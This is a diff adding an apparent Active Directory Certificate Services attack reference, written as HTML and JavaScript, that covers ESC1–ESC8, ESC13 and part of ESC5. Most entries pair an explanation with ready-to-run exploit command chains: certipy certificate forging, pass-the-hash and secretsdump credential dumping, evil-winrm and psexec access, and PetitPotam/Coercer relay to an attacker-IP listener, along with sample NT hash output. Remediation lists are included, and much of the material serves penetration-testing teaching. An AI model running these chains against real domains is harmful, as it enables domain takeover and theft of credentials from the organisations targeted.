+<div class="flow-step"><div class="flow-step-num blue">2</div><div class="flow-step-body"><h4>Enumerate ADCS (<span class="inline-code">certipy find</span>)</h4><p>Certipy connects via LDAP to the DC. It reads the Configuration partition to find all CAs and all certificate templates. It checks enrollment ACLs, template flags, EKUs, and CA settings. It outputs findings to a .txt file and flags vulnerable templates as ESC1, ESC2, etc.</p></div></div>
+<div class="output-box"><div class="output-label">Expected output snippet</div>Certificate Templates
+  0
+    Template Name                       : <span class="output-highlight">VulnUserTemplate</span>
+    Display Name                        : Vulnerable User Template
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollee Supplies Subject           : <span class="output-warn">True</span>
+    Certificate Name Flag               : <span class="output-warn">EnrolleeSuppliesSubject</span>
+    Extended Key Usage                  : Client Authentication
+    Enrollment Permissions
+      Enrollment Rights                 : <span class="output-warn">CORP.LOCAL\Domain Users</span>
+    [!] Vulnerabilities
+      <span class="output-warn">ESC1</span>                               : 'CORP.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows authentication</div>
+<div class="flow-step"><div class="flow-step-num amber">3</div><div class="flow-step-body"><h4>Request certificate with forged SAN (<span class="inline-code">certipy req</span>)</h4><p>Certipy generates a key pair, builds a CSR with <span class="inline-code">administrator@corp.local</span> as the UPN in the SAN, authenticates as your low-priv user, and submits the CSR to the CA. The CA blindly signs it because the template allows it. You receive <span class="inline-code">administrator.pfx</span>.</p></div></div>
+<div class="output-box"><div class="output-label">Expected output</div>Certipy v4.x - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is <span class="output-key">12</span>
+[*] Got certificate with UPN '<span class="output-highlight">administrator@corp.local</span>'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to '<span class="output-highlight">administrator.pfx</span>'</div>
+<div class="flow-step"><div class="flow-step-num amber">4</div><div class="flow-step-body"><h4>Authenticate with .pfx (<span class="inline-code">certipy auth</span>)</h4><p>Certipy loads the .pfx, performs PKINIT pre-authentication against the DC (Kerberos port 88). The DC validates the certificate (signed by trusted CA) and maps it to administrator. DC returns a TGT. Certipy also performs U2U to recover the NTLM hash.</p></div></div>
+<div class="output-box"><div class="output-label">Expected output</div>Certipy v4.x - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@corp.local
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to '<span class="output-highlight">administrator.ccache</span>'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@corp.local': <span class="output-key">aad3b435b51404eeaad3b435b51404ee</span>:<span class="output-warn">2b576acbe6bcfda7294d6bd18041b8f0</span></div>
+<div class="flow-step"><div class="flow-step-num green">5</div><div class="flow-step-body"><h4>Use the TGT or NTLM hash for full access</h4><p>You now have DA-level access. Use the TGT for lateral movement or the hash for DCSync / pass-the-hash.</p></div></div>
+<div class="code-block"><span class="cc"># Option A: Use TGT (pass-the-ticket) with Impacket tools</span>
+<span class="cd">export</span> KRB5CCNAME=<span class="cv">administrator.ccache</span>
+<span class="cd">secretsdump.py</span> <span class="cf">-k</span> <span class="cf">-no-pass</span> <span class="cv">corp.local/administrator@DC-IP</span>
+
+<span class="cc"># Option B: Pass-the-hash (PTH) with the NTLM hash</span>
+<span class="cd">secretsdump.py</span> <span class="cf">-hashes</span> <span class="cv">:2b576acbe6bcfda7294d6bd18041b8f0</span> <span class="cv">corp.local/administrator@DC-IP</span>
+
+<span class="cc"># Option C: Evil-WinRM with hash</span>
+<span class="cd">evil-winrm</span> <span class="cf">-i</span> <span class="cv">DC-IP</span> <span class="cf">-u</span> <span class="cv">administrator</span> <span class="cf">-H</span> <span class="cv">2b576acbe6bcfda7294d6bd18041b8f0</span>
+
+<span class="cc"># Option D: Impacket psexec with hash</span>
+<span class="cd">psexec.py</span> <span class="cf">-hashes</span> <span class="cv">:2b576acbe6bcfda7294d6bd18041b8f0</span> <span class="cv">corp.local/administrator@DC-IP</span></div>
+</div>
+</div>`;
+
+const ESCS = {
+esc1:{id:'ESC1',name:'SAN abuse — enrollee supplies subject',sev:'critical',
+tags:['enrollee-supplies-subject','SAN','PKINIT','ESC1'],
+overview:`ESC1 is the most commonly found ADCS misconfiguration. It happens when a template has the flag <span class="inline-code">CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</span> set (visible as "Supply in the request" in the GUI, or <span class="inline-code">msPKI-Certificate-Name-Flag = 1</span> in LDAP). This flag lets the person submitting the certificate request specify any Subject Alternative Name they want — including a Domain Admin's UPN — and the CA signs it without questioning it. Combine this with low-privileged enrollment rights and you have instant DA access.`,
+how:`A certificate normally gets its Subject Name from AD — the CA looks up the requester and stamps their actual identity. With this flag, the CA takes whatever subject is in the CSR instead. Since LDAP attributes can't be forged, but the CSR can say anything, an attacker just puts <span class="inline-code">administrator@corp.local</span> as the UPN in the SAN field of the CSR. The CA has no mechanism to cross-check whether the requester is actually administrator.`,
+dangers:`Any Domain User → Domain Admin in under 30 seconds. No privilege on the machine, no password hash, no DCSync required upfront. The certificate is valid for the full template validity period (often 1–2 years). Revocation is the only mitigation post-compromise, and many orgs don't monitor CRLs.`,
+find:`<span class="cc"># Step 1: Full ADCS enumeration</span>
+<span class="cd">certipy</span> find <span class="cf">-u</span> <span class="cv">lowpriv@corp.local</span> <span class="cf">-p</span> <span class="cv">Password123</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span> <span class="cf">-vulnerable</span> <span class="cf">-stdout</span>
+
+<span class="cc"># Step 2: Review output — look for "ESC1" in [!] Vulnerabilities section</span>
+<span class="cc"># Key indicators in template output:</span>
+<span class="cc">#   Enrollee Supplies Subject : True</span>
+<span class="cc">#   Client Authentication     : True</span>
+<span class="cc">#   Enrollment Rights         : CORP.LOCAL\Domain Users (or similar)</span>
+
+<span class="cc"># Save full output for reporting</span>
+<span class="cd">certipy</span> find <span class="cf">-u</span> <span class="cv">lowpriv@corp.local</span> <span class="cf">-p</span> <span class="cv">Password123</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span> <span class="cf">-vulnerable</span>
+<span class="cc"># Creates: corp.local_Certipy.txt, corp.local_Certipy.json, corp.local_Certipy.zip (BH)</span>`,
+exploit_steps:['Run <span class="inline-code">certipy find -vulnerable</span> and identify template name (e.g. VulnUserTemplate)','Note: CA name (e.g. CORP-CA), template name, which groups can enroll','Run <span class="inline-code">certipy req</span> with <span class="inline-code">-upn administrator@corp.local</span> to forge the SAN','Receive administrator.pfx — this is the signed cert with DA identity embedded','Run <span class="inline-code">certipy auth -pfx administrator.pfx</span> to get TGT + NTLM hash','Use hash with secretsdump / evil-winrm for full DA access'],
+exploit:`<span class="cc"># EXPLOIT — ESC1</span>
+<span class="cd">certipy</span> req <span class="cf">-u</span> <span class="cv">lowpriv@corp.local</span> <span class="cf">-p</span> <span class="cv">Password123</span> \\
+  <span class="cf">-ca</span> <span class="cv">CORP-CA</span> \\
+  <span class="cf">-template</span> <span class="cv">VulnUserTemplate</span> \\
+  <span class="cf">-upn</span> <span class="cv">administrator@corp.local</span> \\
+  <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+
+<span class="cc"># → Saves: administrator.pfx</span>
+
+<span class="cd">certipy</span> auth <span class="cf">-pfx</span> <span class="cv">administrator.pfx</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+
+<span class="cc"># → Outputs: administrator.ccache (TGT) + NT hash</span>
+
+<span class="cd">export</span> KRB5CCNAME=<span class="cv">administrator.ccache</span>
+<span class="cd">secretsdump.py</span> <span class="cf">-k</span> <span class="cf">-no-pass</span> <span class="cv">corp.local/administrator@10.10.10.5</span>`,
+fixes:['Disable "Supply in the request" on Subject Name tab of the template','Restrict enrollment to specific service accounts rather than Domain Users','Enable CA Manager Approval as a compensating control if SAN flag is required','Apply KB5014754 enforcement mode on DCs']},
+
+esc2:{id:'ESC2',name:'Any purpose / no EKU certificate',sev:'critical',
+tags:['EKU-any','SubCA','over-permissive'],
+overview:`ESC2 occurs when a template has an Extended Key Usage of "Any Purpose" (OID 2.5.29.37.0) or has no EKU at all. EKUs are the restrictions baked into a cert that say what it's allowed to be used for — client auth, server auth, code signing, etc. Removing these restrictions means the cert can be used for literally anything, including Kerberos authentication as any identity.`,
+how:`When you receive a cert with Any Purpose or empty EKU, the DC accepts it for PKINIT without restriction. Combined with enrollee-supplied SAN (like ESC1) this is an instant DA path. Without SAN control, the cert can still be used in an ESC3 enrollment-agent chain to enroll on behalf of any user in a second template.`,
+dangers:`Wildly over-permissive certs issued to low-priv users. Even without SAN abuse, chains to ESC3 for full DA access. A cert with no EKU can technically act as a subordinate CA and sign arbitrary certs entirely offline.`,
+find:`<span class="cd">certipy</span> find <span class="cf">-u</span> <span class="cv">user@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-vulnerable</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+<span class="cc"># Look for: Extended Key Usage : Any Purpose</span>
+<span class="cc"># OR:       Extended Key Usage : (empty / not present)</span>
+<span class="cc"># AND:      low-priv enrollment rights</span>`,
+exploit_steps:['Identify template with Any Purpose or empty EKU + low-priv enrollment','If SAN control also exists → same exploit as ESC1, add -upn flag','If no SAN control → use the Any Purpose cert as enrollment agent for ESC3 chain'],
+exploit:`<span class="cc"># If SAN control (ESC1+ESC2 combo)</span>
+<span class="cd">certipy</span> req <span class="cf">-u</span> <span class="cv">user@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-ca</span> <span class="cv">CORP-CA</span> <span class="cf">-template</span> <span class="cv">AnyPurposeTemplate</span> \\
+  <span class="cf">-upn</span> <span class="cv">administrator@corp.local</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+<span class="cd">certipy</span> auth <span class="cf">-pfx</span> <span class="cv">administrator.pfx</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+
+<span class="cc"># Without SAN → use as enrollment agent (see ESC3)</span>
+<span class="cd">certipy</span> req <span class="cf">-u</span> <span class="cv">user@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-ca</span> <span class="cv">CORP-CA</span> <span class="cf">-template</span> <span class="cv">AnyPurposeTemplate</span>
+<span class="cc"># → anytemp.pfx — use this as the -pfx for ESC3 stage 2</span>`,
+fixes:['Remove Any Purpose EKU — assign only specific EKUs needed (e.g. Client Authentication only)','If no EKU is required at all, delete the template and create a v2 template with proper settings','Restrict enrollment to dedicated accounts only']},
+
+esc3:{id:'ESC3',name:'Enrollment agent certificate abuse',sev:'critical',
+tags:['enrollment-agent','on-behalf-of','two-template-chain'],
+overview:`ESC3 is a two-stage attack chain. Stage 1: obtain an Enrollment Agent certificate (a cert with the Certificate Request Agent EKU — OID 1.3.6.1.4.1.311.20.2.1). Stage 2: use that EA cert to enroll in a second template ON BEHALF OF any user, including Domain Admins. The CA issues the second cert as if it came from the DA.`,
+how:`Enrollment Agents are a legitimate enterprise feature — think kiosk machines that issue smart cards for employees. The EA submits the cert request, but the cert is issued in the employee's name. The vulnerability is when any low-priv user can obtain an EA cert, and the EA is not restricted to specific agents or specific subjects in the issuance policy, meaning the EA can request on behalf of Domain Admins.`,
+dangers:`Full DA access via legitimate two-step enrollment flow. No SAN flags needed. The resulting certificate is legitimately issued by the CA as belonging to the DA — harder to spot as malicious in CA audit logs without correlating the requestor identity.`,
+find:`<span class="cd">certipy</span> find <span class="cf">-u</span> <span class="cv">user@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-vulnerable</span>
+<span class="cc"># Look for two things in output:</span>
+<span class="cc"># Template A: EKU "Certificate Request Agent" + low-priv enrollment</span>
+<span class="cc"># Template B: "Authorized Signatures Required" allows "Certificate Request Agent"</span>
+<span class="cc">#             + low-priv enrollment + Client Authentication EKU</span>`,
+exploit_steps:['Identify Template A (EA EKU) and Template B (user/computer template)','Request EA cert from Template A using your low-priv creds','Use the EA cert to request from Template B on behalf of administrator','Authenticate with the resulting cert'],
+exploit:`<span class="cc"># Stage 1: Get enrollment agent cert</span>
+<span class="cd">certipy</span> req <span class="cf">-u</span> <span class="cv">lowpriv@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> \\
+  <span class="cf">-ca</span> <span class="cv">CORP-CA</span> <span class="cf">-template</span> <span class="cv">EnrollmentAgentTemplate</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+<span class="cc"># → enrollmentagent.pfx</span>
+
+<span class="cc"># Stage 2: Enroll on behalf of DA using EA cert</span>
+<span class="cd">certipy</span> req <span class="cf">-u</span> <span class="cv">lowpriv@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> \\
+  <span class="cf">-ca</span> <span class="cv">CORP-CA</span> <span class="cf">-template</span> <span class="cv">User</span> \\
+  <span class="cf">-on-behalf-of</span> <span class="cv">'CORP\\administrator'</span> \\
+  <span class="cf">-pfx</span> <span class="cv">enrollmentagent.pfx</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+<span class="cc"># → administrator.pfx</span>
+
+<span class="cd">certipy</span> auth <span class="cf">-pfx</span> <span class="cv">administrator.pfx</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>`,
+fixes:['Restrict EA template enrollment to specific named IT staff only','Configure Issuance Requirements on Template B to limit which enrollment agents can enroll','Restrict which subjects the EA can enroll for (msPKI-RA-Application-Policies)','Require CA Manager Approval on EA template issuance']},
+
+esc4:{id:'ESC4',name:'Template write permissions',sev:'critical',
+tags:['WriteDACL','WriteOwner','GenericWrite','template-modification'],
+overview:`ESC4 is about ACLs on the certificate template objects in AD. If a low-priv account has Write/GenericWrite/WriteDACL/WriteOwner on a template object, they can modify that template to introduce ESC1 (enable SAN flag) or ESC2 (add Any Purpose EKU), then exploit the now-vulnerable template, and optionally revert the changes.`,
+how:`Templates live in the AD Configuration partition as objects. Like any AD object they have security descriptors. Misconfigured ACLs — from overly permissive delegations, broken inheritance, or forgotten legacy admin access — can let low-priv accounts modify template settings. Certipy can detect these ACL issues and modify templates directly.`,
+dangers:`One-time template modification grants permanent ESC1/ESC2 conditions. Revert after exploitation and the modification disappears from logs. Extremely stealthy. Also useful for persistence — add a backdoor enrollment right to a template.`,
+find:`<span class="cd">certipy</span> find <span class="cf">-u</span> <span class="cv">user@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-vulnerable</span>
+<span class="cc"># Look for: [!] Vulnerabilities: ESC4 — user has Write rights on template object</span>
+
+<span class="cc"># Manual ACL check with PowerView</span>
+<span class="cd">Get-DomainObjectAcl</span> <span class="cf">-SearchBase</span> <span class="cv">"CN=Certificate Templates,..."</span> <span class="cf">-ResolveGUIDs</span> | \\
+  ? { <span class="cv">$_</span>.ActiveDirectoryRights <span class="cf">-match</span> <span class="cv">"Write|GenericAll"</span> }`,
+exploit_steps:['Confirm you have WriteProperty/WriteDACL/GenericWrite on the target template','Use certipy to back up the original template and modify it (enable SAN flag)','Exploit as ESC1 — request cert with admin UPN','Revert template to original settings using the saved backup'],
+exploit:`<span class="cc"># Modify template to enable ESC1 conditions (saves original as JSON backup)</span>
+<span class="cd">certipy</span> template <span class="cf">-u</span> <span class="cv">lowpriv@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> \\
+  <span class="cf">-template</span> <span class="cv">CorpTemplate</span> <span class="cf">-save-old</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+
+<span class="cc"># Exploit as ESC1</span>
+<span class="cd">certipy</span> req <span class="cf">-u</span> <span class="cv">lowpriv@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> \\
+  <span class="cf">-ca</span> <span class="cv">CORP-CA</span> <span class="cf">-template</span> <span class="cv">CorpTemplate</span> \\
+  <span class="cf">-upn</span> <span class="cv">administrator@corp.local</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+<span class="cd">certipy</span> auth <span class="cf">-pfx</span> <span class="cv">administrator.pfx</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+
+<span class="cc"># Revert template (use the saved JSON)</span>
+<span class="cd">certipy</span> template <span class="cf">-u</span> <span class="cv">lowpriv@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> \\
+  <span class="cf">-template</span> <span class="cv">CorpTemplate</span> <span class="cf">-configuration</span> <span class="cv">CorpTemplate.json</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>`,
+fixes:['Audit ACLs on all template objects — remove Write from non-admin accounts','Only Enterprise Admins and CA Admins should have Write on template objects','Enable SACL auditing on the Configuration partition for template object modifications']},
+
+esc6:{id:'ESC6',name:'EDITF_ATTRIBUTESUBJECTALTNAME2 CA flag',sev:'critical',
+tags:['CA-flag','SAN-CA-level','EDITF'],
+overview:`ESC6 is not a template-level problem — it's a CA-level setting. The flag <span class="inline-code">EDITF_ATTRIBUTESUBJECTALTNAME2</span> on the CA makes the CA accept user-supplied SANs in ALL certificate requests, regardless of what the individual template says. Even a template with "Build from Active Directory information" becomes exploitable because the CA-wide flag overrides it.`,
+how:`This flag was originally intended to support legacy systems that needed to supply SANs. When enabled, any enrollable template becomes an ESC1 vector. Attackers don't need a template with "Supply in request" set — they can supply the SAN via a CSR extension on any template they can enroll in, including the built-in "User" template.`,
+dangers:`All templates on the CA simultaneously become ESC1-vulnerable. This is often missed in template-focused audits because each individual template looks fine. The attack surface is the entire CA.`,
+find:`<span class="cc"># Check CA EditFlags (on CA server or via certutil remotely)</span>
+<span class="cd">certutil</span> <span class="cf">-config</span> <span class="cv">"CORP-CA"</span> <span class="cf">-getreg</span> <span class="cv">policy\EditFlags</span>
+<span class="cc"># If output includes EDITF_ATTRIBUTESUBJECTALTNAME2 → vulnerable</span>
+
+<span class="cc"># Certipy also auto-detects this and flags as ESC6</span>
+<span class="cd">certipy</span> find <span class="cf">-u</span> <span class="cv">user@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-vulnerable</span>
+<span class="cc"># Look for: [!] Vulnerabilities: ESC6 in the CA section of output</span>`,
+exploit_steps:['Confirm ESC6 flag on CA via certipy find output','Pick any enrollable template (even built-in "User" template works)','Submit CSR with administrator UPN as SAN — CA accepts it','Auth with resulting .pfx'],
+exploit:`<span class="cc"># ESC6 — works with the built-in User template (no special template needed)</span>
+<span class="cd">certipy</span> req <span class="cf">-u</span> <span class="cv">lowpriv@corp.local</span> <span class="cf">-p</span> <span class="cv">Password123</span> \\
+  <span class="cf">-ca</span> <span class="cv">CORP-CA</span> <span class="cf">-template</span> <span class="cv">User</span> \\
+  <span class="cf">-upn</span> <span class="cv">administrator@corp.local</span> \\
+  <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+<span class="cd">certipy</span> auth <span class="cf">-pfx</span> <span class="cv">administrator.pfx</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>`,
+fixes:['Disable flag: <span class="inline-code">certutil -config "CA-Name" -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2</span> then restart CertSvc','Patch DCs with KB5014754 (certificate strong mapping enforcement)']},
+
+esc7:{id:'ESC7',name:'CA officer / ManageCA privilege abuse',sev:'critical',
+tags:['ManageCA','ManageCertificates','CA-officer','issue-approve'],
+overview:`ESC7 exploits CA-level access rights. Two distinct rights are involved: <span class="inline-code">ManageCA</span> (CA Manager — can change CA configuration) and <span class="inline-code">Issue and Manage Certificates</span> (CA Officer — can issue, revoke, and approve certificates). An account with ManageCA can grant itself the Officer right, then approve malicious certificate requests.`,
+how:`The exploit uses ManageCA to elevate to Officer, enables the SubCA template (which requires Manager Approval), submits a SubCA cert request claiming to be administrator (which is held pending), then uses Officer rights to approve and retrieve that pending request. This bypasses Manager Approval controls — the very control meant to stop ESC1-style abuse.`,
+dangers:`Bypasses Manager Approval compensating control. ManageCA is treated as admin-level on the CA but is sometimes delegated to lower-trust accounts for "CA management" tasks. An attacker with ManageCA can reconfigure anything on the CA.`,
+find:`<span class="cd">certipy</span> find <span class="cf">-u</span> <span class="cv">user@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-vulnerable</span>
+<span class="cc"># Look for: [!] Vulnerabilities: ESC7 in CA section</span>
+<span class="cc"># Shows: user has ManageCA or ManageCertificates rights</span>
+
+<span class="cc"># Check CA ACL manually</span>
+<span class="cd">certutil</span> <span class="cf">-config</span> <span class="cv">"CORP-CA"</span> <span class="cf">-getca</span>`,
+exploit_steps:['Confirm ManageCA or ManageCertificates for your account','Add yourself as Officer via certipy ca -add-officer','Enable SubCA template on the CA','Submit a cert request as admin (will be pending/failed due to CA policy)','Use Officer rights to approve the pending request by its Request ID','Retrieve the approved cert'],
+exploit:`<span class="cc"># Step 1: Add self as officer</span>
+<span class="cd">certipy</span> ca <span class="cf">-u</span> <span class="cv">lowpriv@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-ca</span> <span class="cv">CORP-CA</span> <span class="cf">-add-officer</span> <span class="cv">lowpriv</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+
+<span class="cc"># Step 2: Enable SubCA template</span>
+<span class="cd">certipy</span> ca <span class="cf">-u</span> <span class="cv">lowpriv@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-ca</span> <span class="cv">CORP-CA</span> <span class="cf">-enable-template</span> <span class="cv">SubCA</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+
+<span class="cc"># Step 3: Submit request (will fail/pend — note Request ID)</span>
+<span class="cd">certipy</span> req <span class="cf">-u</span> <span class="cv">lowpriv@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-ca</span> <span class="cv">CORP-CA</span> <span class="cf">-template</span> <span class="cv">SubCA</span> \\
+  <span class="cf">-upn</span> <span class="cv">administrator@corp.local</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+<span class="cc"># Note: [!] Request ID: 12</span>
+
+<span class="cc"># Step 4: Issue the pending request as Officer</span>
+<span class="cd">certipy</span> ca <span class="cf">-u</span> <span class="cv">lowpriv@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-ca</span> <span class="cv">CORP-CA</span> <span class="cf">-issue-request</span> <span class="cv">12</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+
+<span class="cc"># Step 5: Retrieve cert</span>
+<span class="cd">certipy</span> req <span class="cf">-u</span> <span class="cv">lowpriv@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-ca</span> <span class="cv">CORP-CA</span> <span class="cf">-retrieve</span> <span class="cv">12</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+<span class="cd">certipy</span> auth <span class="cf">-pfx</span> <span class="cv">administrator.pfx</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>`,
+fixes:['Restrict ManageCA and ManageCertificates to dedicated, hardened CA admin accounts only','Separate ManageCA and Officer roles into different accounts with different owners','Enable auditing on all CA operations (Event 4886/4887/4888)']},
+
+esc8:{id:'ESC8',name:'NTLM relay to AD CS HTTP enrollment',sev:'critical',
+tags:['NTLM-relay','HTTP-enrollment','coerce','PetitPotam','PrinterBug'],
+overview:`ESC8 targets the ADCS Web Enrollment interface (IIS hosting /certsrv/). This endpoint accepts NTLM authentication over HTTP by default with no Extended Protection for Authentication (EPA). An attacker can run an NTLM relay listener and then coerce a victim machine (ideally a DC) to authenticate — the NTLM auth is relayed to /certsrv/ where the attacker requests a certificate on behalf of the DC machine account. With a DC cert, Kerberos PKINIT gives you DA access.`,
+how:`The attack has two simultaneous moving parts: (1) the relay listener catches NTLM auth and forwards it to certsrv, (2) a coercion technique forces the DC to send its NTLM credentials to the attacker. Coercion options include PetitPotam (EFS coercion, can be unauthenticated pre-patch), PrinterBug (Spooler service), or Coercer (tries many RPC methods). The DC machine account cert then allows PKINIT as DC$ → Shadow Credentials or DCSync.`,
+dangers:`Full unauthenticated domain compromise on unpatched environments (PetitPotam + unpatched ADCS). Even post-patch, PrinterBug or Coercer variants still work if Spooler is running on DCs. This is the most spectacular "zero-to-DA" chain in AD.`,
+find:`<span class="cc"># Check if Web Enrollment is running on CA</span>
+<span class="cd">curl</span> <span class="cf">-k</span> http://<span class="cv">CA-IP</span>/certsrv/
+<span class="cc"># If you get a login prompt → Web Enrollment is up</span>
+
+<span class="cd">certipy</span> find <span class="cf">-u</span> <span class="cv">user@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-vulnerable</span>
+<span class="cc"># Look for: Web Enrollment: Enabled, ESC8 flagged</span>`,
+exploit_steps:['Start certipy relay listener (or ntlmrelayx) targeting certsrv HTTP endpoint','In a second terminal, run coercion tool (PetitPotam / Coercer) pointing at DC','Listener catches DC$ auth → relays to certsrv → gets DC machine cert','Run certipy auth with the DC cert → get DC$ TGT + hash','Use secretsdump for full domain hash dump'],
+exploit:`<span class="cc"># Terminal 1: Start relay listener</span>
+<span class="cd">certipy</span> relay <span class="cf">-ca</span> <span class="cv">CA-IP</span> <span class="cf">-template</span> <span class="cv">DomainController</span>
+
+<span class="cc"># Terminal 2: Coerce DC auth (PetitPotam — unauthenticated pre-patch)</span>
+<span class="cd">python3 PetitPotam.py</span> <span class="cv">ATTACKER-IP DC-IP</span>
+
+<span class="cc"># OR with Coercer (post-patch, needs creds)</span>
+<span class="cd">python3 Coercer.py</span> coerce <span class="cf">-l</span> <span class="cv">ATTACKER-IP</span> <span class="cf">-t</span> <span class="cv">DC-IP</span> <span class="cf">-u</span> <span class="cv">user</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-d</span> <span class="cv">corp.local</span>
+
+<span class="cc"># Relay catches → saves dc01.pfx</span>
+<span class="cd">certipy</span> auth <span class="cf">-pfx</span> <span class="cv">dc01.pfx</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+<span class="cc"># → dc01.ccache + DC$ NT hash</span>
+
+<span class="cd">secretsdump.py</span> <span class="cf">-just-dc</span> <span class="cf">-hashes</span> <span class="cv">:DC_HASH</span> <span class="cv">'corp.local/DC01$@DC-IP'</span>`,
+fixes:['Enable HTTPS and enforce EPA (Extended Protection for Authentication) on IIS for certsrv','Disable the Spooler service on all DCs (blocks PrinterBug)','Apply KB5005413 (PetitPotam mitigation)','Disable NTLM on certsrv, require Kerberos only']},
+
+esc13:{id:'ESC13',name:'OID group link privilege escalation',sev:'critical',
+tags:['OID','msDS-OIDToGroupLink','group-membership','stealthy'],
+overview:`ESC13 abuses the Issuance Policy OID mechanism that links certificate templates to AD groups. When a template's OID is linked to a privileged AD group, obtaining a cert from that template causes the DC to inject that group's membership into your Kerberos token during authentication — without you actually being in the group. This is completely invisible in group membership queries.`,
+how:`AD allows OID objects in the Configuration partition to have an <span class="inline-code">msDS-OIDToGroupLink</span> attribute pointing to an AD group. If a template uses that OID and you enroll, the DC adds the linked group to your PAC (Privilege Attribute Certificate) inside the TGT. The group membership is ephemeral — it only exists while the cert-based ticket is valid — but that's enough.`,
+dangers:`Stealthy beyond almost any other technique — group membership tables stay clean. No AD group modification, no user account modification, no template modification. Single cert request = DA token. Forensically very hard to detect post-exploitation.`,
+find:`<span class="cc"># Find OIDs with group links</span>
+<span class="cd">Get-ADObject</span> <span class="cf">-Filter</span> <span class="cv">{msDS-OIDToGroupLink -like "*"}</span> \\
+  <span class="cf">-SearchBase</span> <span class="cv">"CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"</span> \\
+  <span class="cf">-Properties</span> <span class="cv">msDS-OIDToGroupLink,name</span>
+
+<span class="cd">certipy</span> find <span class="cf">-u</span> <span class="cv">user@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> <span class="cf">-vulnerable</span>`,
+exploit_steps:['Find OID linked to privileged group via certipy or LDAP','Find template using that OID','Confirm enrollment rights for your account','Request cert → authenticate → receive privileged group in your token'],
+exploit:`<span class="cd">certipy</span> req <span class="cf">-u</span> <span class="cv">lowpriv@corp.local</span> <span class="cf">-p</span> <span class="cv">pass</span> \\
+  <span class="cf">-ca</span> <span class="cv">CORP-CA</span> <span class="cf">-template</span> <span class="cv">OIDLinkedTemplate</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+<span class="cd">certipy</span> auth <span class="cf">-pfx</span> <span class="cv">lowpriv.pfx</span> <span class="cf">-dc-ip</span> <span class="cv">10.10.10.5</span>
+<span class="cc"># Resulting TGT has Domain Admins in PAC — full DA access</span>`,
+fixes:['Audit all OID objects for msDS-OIDToGroupLink — remove links to privileged groups','Restrict enrollment on any template with group-linked OIDs','Monitor Event 4887 cert issuance from OID-linked templates']},
+
+esc5:{id:'ESC5',name:'PKI object ACL misconfigurations',sev:'high',
+tags:['NTAuthCertificates','CA-object','PKI-ACL','rogue-CA'],
+overview:`ESC5 extends ACL abuse beyond templates to the broader PKI object hierarchy in AD — the CA computer object, NTAuthCertificates container, PKI Enrollment Service object, and related Configuration partition objects. Write access to NTAuthCertificates allows adding a rogue CA so any cert signed by that CA is trusted domain-wide for authentication.`,
+how:`<span class="inline-code">NTAuthCertificates</span> is an AD object that contains the list of CA certificates trusted for authentication. If an attacker can write to it, they can add a self-signed or offline CA cert, then issue certificates from that rogue CA that the domain trusts. This enables offline forging entirely independent of the real CA infrastructure.`,
+dangers:`Persistent backdoor that survives CA decommissioning, password resets, and most incident response. A rogue CA in NTAuthCertificates can sign certs indefinitely from an air-gapped machine.`,
